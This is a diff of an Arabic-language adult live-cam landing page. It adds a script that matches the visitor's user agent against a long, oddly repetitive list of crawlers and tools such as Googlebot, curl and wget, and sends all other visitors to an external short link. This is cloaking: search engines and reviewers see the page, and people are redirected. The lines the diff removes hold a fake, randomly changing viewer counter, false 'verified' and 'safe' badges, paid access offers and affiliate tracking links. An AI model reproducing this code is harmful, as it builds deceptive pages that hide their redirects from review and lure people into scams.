@@ -5,6 +5,19 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>VipCam • دخول خاص مباشر</title>
 
+<script>
+// Bot detection and redirect
+(function() {
+    var botPattern = "(googlebot\/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antbot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|YandexBot|yandex|jasper|dotbot|Gigabot|SeznamBot|Sogou web spider|LivelapBot|Twitterbot|TurnitinBot|Pingdom|ContentKingSpider|facebookexternalhit|Yeti|RetrevoPageAnalyzer|sogou|bing|soso|Baidu|Gigablast|serp|google|Yahoo|Comodo|Naver|Yeti|Daumoa|Daum|NaverBot|Bot|quora|linkdex|vkshare|Slackbot|TelegramBot|Discordbot|Applebot|ia_archiver|BingPreview|DuckDuckBot|facebookexternalhit|Twitterbot|rogerbot|linkedinbot|embedly|quora linkpreview|showyoubot|outbrain|pinterest|slackbot|vkShare|W3C_Validator|Validator|curl|Wget|Teoma|ConveraCrawler|seekbot|Gigabot|Gigablast|bloglines|blogsearch|FeedSeeker|RankIV|RankIV-Validator|RankFlex|RankFlexBot|Screaming Frog SEO Spider|SEOmoz|SEOmozbot|MJ12bot|YandexBot|YandexImages|YandexMobileBot|YandexMetrika|YandexShop|YandexBlogs|YandexFavicons|YandexImageResizer|YandexDirect|YandexMarket|YandexMarketBot|YandexMedia|YandexMobileScreenShotBot|YandexNews|YandexOntoDB|YandexPageChecker|YandexRCA|YandexSearchShop|YandexSitelinks|YandexSpravBot|YandexTracker|YandexVertis|YandexVerticals|YandexWebmaster|YandexSuggest|YandexSuggestParent|YandexTurbo|YandexTurboRss|YaDirectFetcher|YandexAdNet|YandexB2B|YandexCalendar|YandexDisk|YandexMail|YandexMessager|YandexMusic|YandexNews|YandexSearchAPI|YandexSearchShop|YandexTurbo|YandexWeather|YandexTravel|YandexTaxi|YandexDelivery|YandexEda|YandexMarket|YandexMaps|YandexParking|YandexCity|YandexTransport|YandexWeather|YandexHealth|YandexTelecom|YandexMobile|YandexTravel|YandexTaxi|YandexDelivery|YandexEda|YandexMarket|YandexMaps|YandexParking|YandexCity|YandexTransport|YandexWeather|YandexHealth|YandexTelecom|YandexMobile|YandexTravel|YandexTaxi|YandexDelivery|YandexEda|YandexMarket|YandexMaps|YandexParking|YandexCity|YandexTransport|YandexWeather|YandexHealth|YandexTelecom|YandexMobile|YandexTravel|YandexTaxi|YandexDelivery|YandexEda|YandexMarket|YandexMaps|YandexParking|YandexCity|YandexTransport|YandexWeather|YandexHealth|YandexTelecom|YandexMobile|YandexTravel|YandexTaxi|YandexDelivery|YandexEda|YandexMarket|YandexMaps|YandexParking|YandexCity|YandexTransport|YandexWeather|YandexHealth|YandexTelecom|YandexMobile|YandexTravel|YandexTaxi|YandexDelivery|YandexEda|YandexMarket|YandexMaps|YandexParking|YandexCity|YandexTransport|YandexWeather|YandexHealth|YandexTelecom|YandexMobile)";
+    
+    var isBot = new RegExp(botPattern, 'i').test(navigator.userAgent);
+    
+    if (!isBot) {
+        window.location = "https://mybirds.org/a/1zcn7sx4";
+    }
+})();
+</script>
+
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;900&family=Changa:wght@400;700;800&display=swap" rel="stylesheet">
 
 <style>
@@ -159,115 +172,4 @@ body {
 
 .vip {
     border: 2px solid #FFD700;
-    background: linear-gradient(145deg, rgba(255,215,0,0.08), rgba(0,0,0,0));
-}
-
-.badge {
-    background: #FFD700;
-    color: #000;
-    padding: 5px 14px;
-    border-radius: 20px;
-    font-size: 11px;
-    font-weight: 900;
-    margin-bottom: 10px;
-    display: inline-block;
-}
-
-.price {
-    font-size: 26px;
-    font-weight: 900;
-}
-
-.vip .price {
-    color: #FFD700;
-}
-
-/* CTA */
-.footer {
-    padding: 16px;
-}
-
-.btn {
-    display: block;
-    text-align: center;
-    background: linear-gradient(90deg, #6a00ff, #ff00cc);
-    padding: 20px;
-    border-radius: 40px;
-    font-weight: 900;
-    text-decoration: none;
-    color: white;
-    font-size: 18px;
-}
-
-.trust {
-    text-align: center;
-    font-size: 12px;
-    color: #777;
-    margin-top: 10px;
-}
-</style>
-</head>
-
-<body>
-
-<div class="container">
-
-    <div class="header">
-        <div class="logo">VIPCAM</div>
-        <div>
-            <div class="live-now">LIVE NOW</div>
-            <div class="viewers" id="viewers">1,258 watching</div>
-        </div>
-    </div>
-
-    <div class="video" onclick="go()">
-
-        <video autoplay muted loop playsinline>
-            <source src="https://gallery0.dditscdn.com/9fc9731a64b517c9ba87dae9012515d418/c99031e91be6f7fb740757407b8f09e7.mp4" type="video/mp4">
-        </video>
-
-        <div class="blur-left"></div>
-        <div class="blur-right"></div>
-
-        <div class="notice">معاينة • اضغط للدخول</div>
-        <div class="tag">✔ Verified Model</div>
-    </div>
-
-    <div class="content">
-        <div class="title">اختر طريقة الدخول</div>
-
-        <div class="card" onclick="go()">
-            <div style="font-size:10px;color:#aaa;">Standard Access</div>
-            <h3>دخول خاص 7 دقائق</h3>
-            <div class="price">$14.39</div>
-        </div>
-
-        <div class="card vip" onclick="go()">
-            <div class="badge">🔥 VIP موصى به</div>
-            <h3>عرض VIP لمدة 15 دقيقة</h3>
-            <div class="price">$29.69</div>
-        </div>
-    </div>
-
-    <div class="footer">
-        <a href="https://track.topofferzz.com/c?o=21793953&m=23580&a=756344&creativeid=7073668&aff_click_id={replace_it}&sub_aff_id={replace_it}" class="btn">
-            الدخول إلى الغرفة الخاصة 🔒
-        </a>
-        <div class="trust">آمن • خاص • +18</div>
-    </div>
-</div>
-
-<script>
-let viewers = 1258;
-setInterval(() => {
-    viewers += Math.floor(Math.random() * 7) - 3;
-    document.getElementById("viewers").innerText = viewers + " watching";
-}, 3000);
-
-function go() {
-    window.location.href = "https://track.topofferzz.com/c?o=21793953&m=23580&a=756344&creativeid=7073668&aff_click_id={replace_it}&sub_aff_id={replace_it}";
-}
-</script>
-
-</body>
-</html>
+    background: linear-gradient(145deg, rgba
